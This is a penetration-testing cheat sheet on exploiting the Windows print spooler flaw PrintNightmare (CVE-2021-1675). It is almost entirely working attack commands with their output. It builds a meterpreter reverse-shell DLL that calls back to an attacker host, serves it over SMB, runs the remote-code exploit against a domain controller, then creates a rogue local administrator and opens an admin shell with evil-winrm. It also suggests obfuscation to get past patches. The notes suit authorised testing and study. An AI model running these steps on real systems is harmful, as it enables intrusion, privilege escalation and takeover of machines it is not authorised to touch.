# PrintNightmare

## PrintNightmare (CVE-2021-1675) - RCE

- Takes advantage of printer spooler that runs as sys priv
- Check if our target is vulnerable `rpcdump.py @DOMAIN-CONTROLLER-IP | egrep 'MS-RPRN|MS-PAR'`
- Create a malicious dll to run it along the py file from the resource `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ATTACKING-MACHINE-IP LPORT=4444 -f dll > shell.dll` 
  ```
  ┌──(root💀kali)-[/home/kali]
  └─# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.8 LPORT=4444 -f dll > shell.dll                                                                                                           2 ⨯
  [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
  [-] No arch selected, selecting arch: x64 from the payload
  No encoder specified, outputting raw payload
  Payload size: 510 bytes
  Final size of dll file: 8704 bytes
  ```
- run `msfconsole` to catch the shell `use multi/handler` `set payload windows/x64/meterpreter/reverse_tcp` set LHOST and LPORT
- setup a file share with smbserver.py (Impacket): `smbserver.py share 'pwd' -smb2support` (will share current working dir)
- Run the exploit `python3 exploit.py domain.local/username:password@DOMAIN-CONTROLLER-IP-ADD '\\ATTACKING-MACHINE-IP\share\shell.dll'`
- We should get a shell

*Note: With patches it might be necessary to use obfuscations techniques*

## - PrintNightmare - LPE

- Create an user admin from the compromised machine:
```
*Evil-WinRM* PS C:\Users\user\Documents> Import-Module .\CVE-2021-1675.ps1
[STRIPPED]
*Evil-WinRM* PS C:\Users\user\Documents> Invoke-Nightmare -NewUser "adminhackr" -NewPassword "adminhackr1!" -DriverName "PrintMe"
[STRIPPED]
[+] created payload at C:\Users\user\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_19a3fe50fa9a21b6\Amd64\mxdwdrv.dll"
[+] added user adminhackr as local administrator
[+] deleting payload from C:\Users\user\AppData\Local\Temp\nightmare.dll
```

- We launch evilwinrm with this new user and we have an admin shell:
```
┌──(kali㉿kali)-[~]
└─$ proxychains evil-winrm -i 172.16.2.5 -u adminhackr -p adminhackr1!                                                                                                                               76 ⨯
[STRIPPED]
Evil-WinRM shell v2.4

Info: Establishing connection to remote endpoint

[proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  172.16.2.5:5985  ...  OK
*Evil-WinRM* PS C:\Users\adminhackr\Documents> 
```

### PrintNightmare - Resources

- [cube0x0 RCE](https://github.com/cube0x0/CVE-2021-1675)
- [calebstewart LPE](https://github.com/calebstewart/CVE-2021-1675)
- [Playing with PrintNightmare - 0xdf hacks stuff](https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html#target)
- [PrintNightmare - TheMayor Pentesting notes](https://themayor.notion.site/d7a4f698bd2d453cbb55a60c6458542e?v=ec41d2f3c44743949e47237c03e82b1b&p=136a31bb0933493d852f3b9d38e8544f)
